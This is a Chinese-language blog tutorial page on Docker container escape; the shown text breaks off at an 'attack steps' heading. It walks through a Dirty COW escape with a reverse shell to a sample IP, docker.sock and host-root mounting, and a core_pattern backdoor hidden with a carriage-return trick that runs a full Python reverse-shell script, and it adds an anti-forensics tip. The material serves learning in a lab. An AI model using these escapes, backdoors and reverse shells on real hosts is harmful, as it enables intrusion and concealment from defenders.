@@ -1,0 +1,743 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="初探Docker容器逃逸判断是否处于Container中123&#x2F;.dockerenv文件&#x2F;proc&#x2F;1&#x2F;cgroup文件是否存在&quot;docker&quot;字符串是否有container环境变量  Container逃逸与容器共享存在漏洞的内核Dirty  Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探Docker容器逃逸">
+<meta property="og:url" content="http://example.com/2022/04/11/%E5%88%9D%E6%8E%A2Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="🗄">
+<meta property="og:description" content="初探Docker容器逃逸判断是否处于Container中123&#x2F;.dockerenv文件&#x2F;proc&#x2F;1&#x2F;cgroup文件是否存在&quot;docker&quot;字符串是否有container环境变量  Container逃逸与容器共享存在漏洞的内核Dirty  Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fseo-1255598498.file.myqcloud.com%2Ffull%2F66ec0965a96e9a6d2d1c191ebcc8807ba71baa93.jpg&refer=http%3A%2F%2Fseo-1255598498.file.myqcloud.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113819&t=6abc442e6df87436f6b850b78b48ceda">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220408225310174.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212210034.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212246397.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212414544.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409214204019.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409215346242.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409231445112.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220410221555377.png">
+<meta property="article:published_time" content="2022-04-11T03:04:29.905Z">
+<meta property="article:modified_time" content="2022-04-11T03:05:48.098Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="knowledge">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fseo-1255598498.file.myqcloud.com%2Ffull%2F66ec0965a96e9a6d2d1c191ebcc8807ba71baa93.jpg&refer=http%3A%2F%2Fseo-1255598498.file.myqcloud.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113819&t=6abc442e6df87436f6b850b78b48ceda">
+  
+  <title>初探Docker容器逃逸 - 🗄</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>👩‍💻</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="初探Docker容器逃逸">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-11 11:04" pubdate>
+        April 11, 2022 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      8.1k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      NaN 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">初探Docker容器逃逸</h1>
+            
+            <div class="markdown-body">
+              <h1 id="初探Docker容器逃逸"><a href="#初探Docker容器逃逸" class="headerlink" title="初探Docker容器逃逸"></a>初探Docker容器逃逸</h1><h2 id="判断是否处于Container中"><a href="#判断是否处于Container中" class="headerlink" title="判断是否处于Container中"></a>判断是否处于Container中</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">/.dockerenv文件<br><span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/cgroup文件是否存在<span class="hljs-string">&quot;docker&quot;</span>字符串<br>是否有container环境变量<br></code></pre></td></tr></table></figure>
+
+<h2 id="Container逃逸"><a href="#Container逃逸" class="headerlink" title="Container逃逸"></a>Container逃逸</h2><h3 id="与容器共享存在漏洞的内核"><a href="#与容器共享存在漏洞的内核" class="headerlink" title="与容器共享存在漏洞的内核"></a>与容器共享存在漏洞的内核</h3><p>Dirty  Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。</p>
+<p>VDSO就是Virtual Dynamic Shared  Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</p>
+<p>内核版本低于如下版本，则存在脏牛漏洞。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Centos7</span> /RHEL<span class="hljs-number">7</span>  <span class="hljs-number">3</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>-<span class="hljs-number">327</span>.<span class="hljs-number">36</span>.<span class="hljs-number">3</span>.el<span class="hljs-number">7</span><br><span class="hljs-attribute">Cetnos6</span>/RHEL<span class="hljs-number">6</span>   <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span>-<span class="hljs-number">642</span>.<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">6</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">16</span>.<span class="hljs-number">10</span>    <span class="hljs-number">4</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">26</span>.<span class="hljs-number">28</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">16</span>.<span class="hljs-number">04</span>    <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">45</span>.<span class="hljs-number">66</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">14</span>.<span class="hljs-number">04</span>    <span class="hljs-number">3</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">100</span>.<span class="hljs-number">147</span><br><span class="hljs-attribute">Debian</span> <span class="hljs-number">8</span>        <span class="hljs-number">3</span>.<span class="hljs-number">16</span>.<span class="hljs-number">36</span>-<span class="hljs-number">1</span>+deb<span class="hljs-number">8</span>u<span class="hljs-number">2</span><br><span class="hljs-attribute">Debian</span> <span class="hljs-number">7</span>        <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">82</span>-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>环境：</strong></p>
+<p>宿主机：<a target="_blank" rel="noopener" href="http://old-releases.ubuntu.com/releases/14.04.0/ubuntu-14.04.5-server-amd64.iso">Ubuntu 14.04.5</a></p>
+<p>容器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/gebl/dirtycow-docker-vdso.git<br><span class="hljs-built_in">cd</span> dirtycow-docker-vdso/<br>docker-compose run dirtycow /bin/bash<br><br><span class="hljs-built_in">cd</span> /dirtycow-vdso/<br>make<br>./0xdeadbeef 1.1.1.1:2333 // 反弹shell<br></code></pre></td></tr></table></figure>
+
+<h3 id="不安全挂载"><a href="#不安全挂载" class="headerlink" title="不安全挂载"></a>不安全挂载</h3><h4 id="挂载docker-sock"><a href="#挂载docker-sock" class="headerlink" title="挂载docker.sock"></a>挂载docker.sock</h4><p><strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/boling_cavalry/article/details/92846483">前置知识</a>：</strong></p>
+<p>首先，我们使用过docker的都知道</p>
+<blockquote>
+<p>docker ps  //列出Up容器</p>
+<p>docker images //列出所有的镜像</p>
+</blockquote>
+<p>就这样的命令，牵扯到docker的C/S架构：三个组件(client，daemon，registry)，两个概念(image和container)</p>
+<p>Docker的C/S架构，通信方式有以下3种：</p>
+<ul>
+<li>unix:///var/run/docker.sock(默认)</li>
+<li>tcp://host:port</li>
+<li>fd://socketfd</li>
+</ul>
+<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fseo-1255598498.file.myqcloud.com%2Ffull%2F66ec0965a96e9a6d2d1c191ebcc8807ba71baa93.jpg&refer=http%3A%2F%2Fseo-1255598498.file.myqcloud.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113819&t=6abc442e6df87436f6b850b78b48ceda" srcset="/img/loading.gif" lazyload></p>
+<p>我们熟知的Docker命令就是Client；Docker Daemon是Docker架构中一个常驻在后台的系统进程，该守护进程在后台启动了一个Server，该Server负责接受Docker Client发送的请求；并通过路由与分发调度找到相应的Handler来执行请求。</p>
+<p>在Linux系统中，Docker Daemon启动使用的可执行文件也是docker，与Docker Client启动所使用的可执行文件docker相同。在docker命令执行时，通过传入的参数来判别Docker Daemon与Docker Client。</p>
+<p><a target="_blank" rel="noopener" href="https://yanbin.blog/replace-docker-desktop-with-hyperkit-minikube/">Docker Desktop收费的那些事</a></p>
+<p>我们更熟悉的CLI模式是怎么工作的呢？</p>
+<p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option">Daemon</a></p>
+<p><a target="_blank" rel="noopener" href="https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd">/var/run/docker.sock</a></p>
+<p>那么刚刚两条命令就可以等价于</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json<br>curl -s --unix-socket /var/run/docker.sock http://localhost/images/json<br></code></pre></td></tr></table></figure>
+
+<p>现在我们就完全明白Docker也是基于C/S架构，其中Daemon会监听/var/run/docker.sock这个文件，我们向这个文件发送合适的请求，可以达到docker命令在终端同样的操作</p>
+<p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/api/">各个版本的API接口</a>：<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/api/v1.41/#operation/ContainerList">https://docs.docker.com/engine/api/v1.41/#operation/ContainerList</a></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220408225310174.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>环境搭建：</strong></p>
+<blockquote>
+<p>docker pull rocm/dev-ubuntu-18.04  //随便找一个镜像</p>
+<p>docker run -id -v /var/run/docker.sock:/var/run/docker.sock edb  //创建一个挂载了/var/run/docker.sock的容器</p>
+<p>docker exec -it 517 /bin/bash  //进入容器内部</p>
+</blockquote>
+<p>至此，我们已经在实战的一个环境下了</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212210034.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212246397.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212414544.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>攻击步骤：</strong></p>
+<ol>
+<li>在该容器环境下，安装docker</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL get.docker.com -o get-docker.sh  //官方脚本安装<br>sh get-docker.sh --mirror Aliyun<br></code></pre></td></tr></table></figure>
+
+<p>安装完docker，因为挂载了/var/run/docker.sock，通过docker命令，我们发现可以列出宿主机的所有docker容器和镜像</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409214204019.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li>通过挂载，创建一个新的容器，并挂载宿主机的根目录</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -v /:/a edb /bin/bash  //-id需要<span class="hljs-built_in">exec</span>进入容器<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>在新的容器，更换根目录到挂载的宿主机的根目录</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">chroot /a<br><span class="hljs-comment"># /bin/bash</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409215346242.png" srcset="/img/loading.gif" lazyload></p>
+<p>至此，基本从容器逃逸出来了</p>
+<h4 id="挂载procfs"><a href="#挂载procfs" class="headerlink" title="挂载procfs"></a>挂载procfs</h4><p>进一步地，我们ps查看进程发现，“逃逸出来的容器“的进程还是容器内的，因为没有挂载procfs</p>
+<blockquote>
+<p>man proc  //查看文档</p>
+</blockquote>
+<p>或者<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man5/proc.5.html">Online Manual Pages</a></p>
+<p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是没有开启<code>User Namespace</code>时并且在该容器内默认启用root权限</p>
+<p>procfs中的<code>/proc/sys/kernel/core_pattern</code>负责配置进程崩溃时内存转储数据的导出方式</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409231445112.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>基于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1098">core_pattern用来隐藏系统后门</a>这篇文章，实验如下：</p>
+<ul>
+<li><strong>环境搭建：</strong>创建一个挂载了宿主机/proc目录的容器</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -v /proc:/a/proc edb /bin/bash<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>攻击步骤：</strong>在容器内(相当于实战环境下)</li>
+</ul>
+<p>\rcore是写入文件掩盖后门的作用，<code>\r将光标移动至行首，但不换行</code>，cat会遮盖<code>|</code>，vim可以看到端倪</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|/tmp/.conn.py \rcore    &quot;</span> &gt;  /proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure>
+
+<p>然后准备脚本/tmp/.conn.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br>Rhost = <span class="hljs-string">&quot;ip&quot;</span><br>Rport = port<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>   s.connect((Rhost, Rport))<br>   os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>   os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>   os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>   os.putenv(<span class="hljs-string">&quot;HISTFILE&quot;</span>, <span class="hljs-string">&#x27;/dev/null&#x27;</span>)<br>   pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>   <span class="hljs-comment"># os.remove(&#x27;/tmp/.conn.py&#x27;) //实战中防溯源，进一步还可以再恢复/删除掉core_pattern这个文件</span><br>   s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   main()<br></code></pre></td></tr></table></figure>
+
+<p>因为是脚本运行，需要加执行权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x .conny.py<br></code></pre></td></tr></table></figure>
+
+<p>准备一个可以引起崩溃的c代码</p>
+<p>crash.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>	<span class="hljs-keyword">int</span> *a = <span class="hljs-literal">NULL</span>;<br>	*a = <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc crash.c -o crash<br></code></pre></td></tr></table></figure>
+
+<p>服务器监听，运行crash反弹shell</p>
+</blockquote>
+<p>细心的朋友注意到，原文实验并非基于docker逃逸的，那么我们能否直接写入<code>core_pattern</code>文件进行docker逃逸呢</p>
+<p>注意到写入的<code>/proc/sys/kernel/core_pattern</code>文件是在宿主机的，而<code>/tmp/.conn.py</code>是在容器内的</p>
+<p>所以我们需要获得<code>/tmp/.conn.py</code>在宿主机的绝对路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /proc/mounts | grep docker<br></code></pre></td></tr></table></figure>
+
+<p>其中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">workdir=/var/lib/docker/overlay2/17759ecee79fc4ddd2450e20beffc4a2d2e0c785be630d1055bc7e1329660056/work<br></code></pre></td></tr></table></figure>
+
+<p>那么我们可知，其绝对路径为</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>overlay2<span class="hljs-regexp">/17759ecee79fc4ddd2450e20beffc4a2d2e0c785be630d1055bc7e1329660056/</span>diff<br></code></pre></td></tr></table></figure>
+
+<p>因此命令改写为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|/var/lib/docker/overlay2/17759ecee79fc4ddd2450e20beffc4a2d2e0c785be630d1055bc7e1329660056/merged/tmp/.conn.py \rcore    &quot;</span> &gt;  /a/proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure>
+
+<p>其他步骤不变即可反弹shell</p>
+<p>进一步优化步骤</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">real_path=`sed -n <span class="hljs-string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|real_path/tmp/.conn.py \rcore    &quot;</span> &gt;  /proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure>
+
+<h3 id="不安全配置"><a href="#不安全配置" class="headerlink" title="不安全配置"></a>不安全配置</h3><h4 id="docker-remote-api"><a href="#docker-remote-api" class="headerlink" title="docker remote api"></a>docker remote api</h4><p><strong>检测方式：</strong></p>
+<blockquote>
+<p>直接访问 ip:2375/version ip:2375/containers/json等</p>
+<p>docker -H tcp://ip:2375 ps #返回了容器列表则漏洞存在</p>
+</blockquote>
+<p><strong>利用方式：</strong></p>
+<p>可以参考不安全挂载，反弹shell(逃逸出来后写计划任务反弹shell、写ssh公钥)</p>
+<p>利用脚本：<a target="_blank" rel="noopener" href="https://github.com/Tycx2ry/docker_api_vul">https://github.com/Tycx2ry/docker_api_vul</a></p>
+<h4 id="privilege容器逃逸"><a href="#privilege容器逃逸" class="headerlink" title="privilege容器逃逸"></a>privilege容器逃逸</h4><p>当操作者执行<code>docker run --privileged</code>时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限</p>
+<p><strong>特权容器判断：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /proc/1/status | grep Cap<br></code></pre></td></tr></table></figure>
+
+<p>存在值<code>0000003fffffffff</code>即为特权容器</p>
+<blockquote>
+<p>–privileged所指的特权容器并不等于Capabilities加满，事实上，前者是包含后者的。具体来说，–privileged至少包含以下能力：</p>
+<ol>
+<li>Capabilities加满</li>
+<li>禁用Seccomp和AppArmor等安全机制</li>
+<li>能够“看到”很多敏感的dev设备</li>
+</ol>
+<p>linux的Capabilities机制<br><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a><br>它对用户的权限进行了更细致的分类，可以对单个线程进行更精度的权限控制。避免粗暴的root特权用户和常规用户的简单区分。当一个进程要进行某个特权操作时,操作系统会检查cap_effective的对应位是否有效,而不再是检查进程的有效UID是否为0。</p>
+<p>一个线程拥有五个Capabilities集合<code>Permitted</code>、<code>Inheritable</code>、<code>Effective</code>、<code>Bounding</code>和<code>Ambient</code><br>分别对应了<code>/proc/self/status</code>中的<code>CapPrm</code>、<code>CapInh</code>、<code>CapEff</code>、<code>CapBnd</code>和<code>CapAmb</code><br><code>Effective</code>集合就是主要的当前线程特权操作权限（Capabilities）的集合。</p>
+</blockquote>
+<p><strong>环境：</strong></p>
+<p>以特权模式启动的容器，<code>fdisk -l</code></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220410221555377.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在相当于完成了<strong>挂载docker.sock</strong>中的第二步，启动了一个挂载了根目录的容器</p>
+<p><strong>攻击步骤：</strong></p>
